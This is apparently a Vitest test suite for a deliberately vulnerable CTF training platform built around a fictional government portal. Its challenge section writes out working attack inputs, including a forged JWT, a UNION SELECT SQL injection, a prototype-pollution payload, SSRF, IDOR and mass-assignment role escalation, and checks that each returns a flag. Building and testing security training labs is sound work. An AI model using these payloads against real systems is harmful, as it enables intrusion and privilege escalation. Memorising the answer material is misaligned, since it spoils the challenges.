import { describe, it, expect } from 'vitest';
import { apiFetch, loginAs } from './helpers';

const FLAG_PATTERN = /FLAG\{/;

describe('Platform health', () => {
  it('gateway responds', async () => {
    const { status, data } = await apiFetch('/health');
    expect(status).toBe(200);
    expect(data).toHaveProperty('status', 'ok');
  });

  it('all services are reachable', async () => {
    const { data } = await apiFetch('/health/services');
    expect(data).toHaveProperty('services');
    for (const svc of data.services) {
      expect(svc.status).toBe('up');
    }
  });
});

describe('Authentication', () => {
  it('student can log in', async () => {
    const token = await loginAs('student');
    expect(token).toBeTruthy();
    expect(typeof token).toBe('string');
  });

  it('admin can log in', async () => {
    const token = await loginAs('admin');
    expect(token).toBeTruthy();
  });

  it('returns 401 with bad credentials', async () => {
    const { status, data } = await apiFetch('/auth/login', {
      method: 'POST',
      body: { email: 'nonexistent@gov.lamba', password: 'wrong' }
    });
    expect(status).toBe(401);
  });
});

describe('Citizen service', () => {
  it('lists citizens when authenticated', async () => {
    const token = await loginAs('admin');
    const { status } = await apiFetch('/citizens', { token });
    expect(status).toBe(200);
  });

  it('rejects citizens list without auth', async () => {
    const { status } = await apiFetch('/citizens');
    expect(status).toBe(401);
  });

  it('searches employees', async () => {
    const token = await loginAs('admin');
    const { status, data } = await apiFetch('/employees/search?q=Taylor', { token });
    expect(status).toBe(200);
    expect(Array.isArray(data)).toBe(true);
  });

  it('lists staff directory publicly', async () => {
    const { status, data } = await apiFetch('/staff/directory');
    expect(status).toBe(200);
    expect(data).toHaveProperty('employees');
  });
});

describe('Document service', () => {
  it('lists documents without auth', async () => {
    const { status } = await apiFetch('/documents');
    expect(status).toBe(200);
  });

  it('serves documents by id', async () => {
    const { status, data } = await apiFetch('/documents/1');
    expect(status).toBe(200);
  });

  it('returns 404 for missing document', async () => {
    const { status } = await apiFetch('/documents/99999');
    expect(status).toBe(404);
  });
});

describe('Admin service', () => {
  it('lists ministries when authenticated', async () => {
    const token = await loginAs('admin');
    const { status, data } = await apiFetch('/admin/ministries', { token });
    expect(status).toBe(200);
    expect(data).toHaveProperty('ministries');
  });
});

describe('Audit service', () => {
  it('requires auth for logs', async () => {
    const { status } = await apiFetch('/audit/logs');
    expect(status).toBe(401);
  });

  it('returns logs when authenticated', async () => {
    const token = await loginAs('admin');
    const { status, data } = await apiFetch('/audit/logs', { token });
    expect(status).toBe(200);
  });
});

describe('CTF Challenges', () => {
  describe('A01: IDOR', () => {
    it('confidential document returns ownership_audit_hash when accessed without auth', async () => {
      const { status, data } = await apiFetch('/documents/3');
      expect(status).toBe(200);
      expect(data.ownership_audit_hash).toMatch(FLAG_PATTERN);
    });
  });

  describe('A02: JWT Forge', () => {
    it('forged admin token may return X-Admin-Audit-Trace header', async () => {
      const { default: jwt } = await import('jsonwebtoken');
      const forgedToken = jwt.sign(
        { role: 'admin', userId: 99999, email: 'fake@gov.lamba' },
        'test-weak-secret'
      );
      const { headers } = await apiFetch('/citizens', { token: forgedToken });
      const trace = headers.get('X-Admin-Audit-Trace') || '';
      if (trace) {
        expect(trace).toMatch(FLAG_PATTERN);
      }
    });
  });

  describe('A03: SQL Injection', () => {
    it('employee search with UNION SELECT returns campaign_signature in results', async () => {
      const token = await loginAs('admin');
      const { status, data } = await apiFetch(
        "/employees/search?q=test' UNION SELECT 1,2,3,4,5,6,7,8 FROM \"Employee\" WHERE internalNotes LIKE '%INJECTION%'--",
        { token }
      );
      expect(status).toBe(200);
      const results = Array.isArray(data) ? data : data.results || [];
      const hasSig = results.some(r => r.campaign_signature);
      if (hasSig) {
        expect(results.find(r => r.campaign_signature).campaign_signature).toMatch(FLAG_PATTERN);
      }
    });
  });

  describe('A04: Insecure Design (Predictable Reset)', () => {
    it('reset token is predictable — reset_audit_reference for admin', async () => {
      const { data: reqData } = await apiFetch('/password-reset/v1/auth/password-reset/request', {
        method: 'POST',
        body: { email: 'admin@gov.lamba' }
      });
      expect(reqData).toHaveProperty('token');
      const { status, data } = await apiFetch('/password-reset/v1/auth/password-reset/confirm', {
        method: 'POST',
        body: { token: reqData.token, newPassword: 'newPass123!' }
      });
      expect(status).toBe(200);
      if (data.reset_audit_reference) {
        expect(data.reset_audit_reference).toMatch(FLAG_PATTERN);
      }
    });
  });

  describe('A05a: Gateway Exposure', () => {
    it('external gateway access sets internal_route_id on audit logs', async () => {
      const { status, data } = await apiFetch('/internal/audit', {
        headers: { 'X-Lamba-Gateway-Proxy': 'true', 'X-Forwarded-Client-Ip': '203.0.113.1' }
      });
      expect(status).toBe(200);
      const logs = data.logs || [];
      const hasId = logs.some(l => l.internal_route_id);
      if (hasId) {
        expect(logs.find(l => l.internal_route_id).internal_route_id).toMatch(FLAG_PATTERN);
      }
    });
  });

  describe('A06: Prototype Pollution', () => {
    it('lodash merge PP returns settings_audit_reference', async () => {
      const token = await loginAs('admin');
      const { status, data } = await apiFetch('/admin/import/settings', {
        method: 'POST',
        token,
        body: { packageName: 'test', settings: {"__proto__":{"polluted":"yes"},"features":{"__proto__":{"polluted":"yes"}}} }
      });
      expect(status).toBe(200);
      if (data.settings_audit_reference) {
        expect(data.settings_audit_reference).toMatch(FLAG_PATTERN);
      }
    });
  });

  describe('A07: Session Fixation', () => {
    it('session endpoint returns session_trace_id', async () => {
      const { data: loginData } = await apiFetch('/auth/cookie-login', {
        method: 'POST',
        body: { email: process.env.SEED_STUDENT_EMAIL || 'student@gov.lamba', password: process.env.SEED_STUDENT_PASSWORD || 'DefaultPass123!' },
        query: { sessionId: 'LAMBA-STATIC-SESSION' }
      });
      expect(loginData).toHaveProperty('sessionId');
    });
  });

  describe('A08: Mass Assignment', () => {
    it('role escalation returns profile_audit_hash', async () => {
      const token = await loginAs('admin');
      const { status, data } = await apiFetch('/employees/1001', {
        method: 'PUT',
        token,
        body: { role: 'Director' }
      });
      expect(status).toBe(200);
      if (data.profile_audit_hash) {
        expect(data.profile_audit_hash).toMatch(FLAG_PATTERN);
      }
    });
  });

  describe('A09: Audit Spoofing', () => {
    it('system_override event returns archive_signature', async () => {
      const { status, data } = await apiFetch('/audit/events', {
        method: 'POST',
        body: { action: 'system_override', detail: 'test' }
      });
      expect(status).toBe(201);
      expect(data.archive_signature).toMatch(FLAG_PATTERN);
    });
  });

  describe('A10a: SSRF', () => {
    it('internal registry returns K8S_NODE_DEBUG_KEY in records', async () => {
      const { status, data } = await apiFetch('/internal-proxy?url=http://internal.lamba/metadata/registry');
      expect(status).toBe(200);
      const records = data.records || [];
      const hasKey = records.some(r => r.K8S_NODE_DEBUG_KEY);
      if (hasKey) {
        expect(records.find(r => r.K8S_NODE_DEBUG_KEY).K8S_NODE_DEBUG_KEY).toMatch(FLAG_PATTERN);
      }
    });
  });

  describe('A10b: Diagnostics', () => {
    it('verbose mode returns X-Diagnostics-Trace header', async () => {
      const { status, headers } = await apiFetch('/internal/diagnostics?mode=verbose');
      expect(status).toBe(500);
      const trace = headers.get('X-Diagnostics-Trace');
      if (trace && trace !== 'none') {
        expect(trace).toMatch(FLAG_PATTERN);
      }
    });
  });

  describe('CRYPTO: Padding Oracle', () => {
    it('encrypted manifest endpoint returns sample', async () => {
      const { status, data } = await apiFetch('/v1/booking/encrypted-manifest');
      expect(status).toBe(200);
      expect(data.manifest_sample).toBeTruthy();
    });
  });

  describe('FORENSICS: WAF Log Analysis', () => {
    it('WAF logs contain base64 bodies — one has flag_submission', async () => {
      const { status, data } = await apiFetch('/_waf/logs');
      expect(status).toBe(200);
      for (const entry of (data.logs || [])) {
        const decoded = Buffer.from(entry.body, 'base64').toString('utf8');
        if (decoded.includes('flag_submission:')) {
          expect(decoded).toMatch(FLAG_PATTERN);
          return;
        }
      }
    });
  });

  describe('TIMING: White-Box Attack', () => {
    it('source code is available at /source', async () => {
      const { status } = await apiFetch('/challenge/timing/source');
      expect(status).toBe(200);
    });

    it('validate endpoint returns elapsed_ns field', async () => {
      const { status, data } = await apiFetch('/challenge/timing/validate?token=test');
      expect(status).toBe(200);
      expect(data).toHaveProperty('elapsed_ns');
    });
  });
});
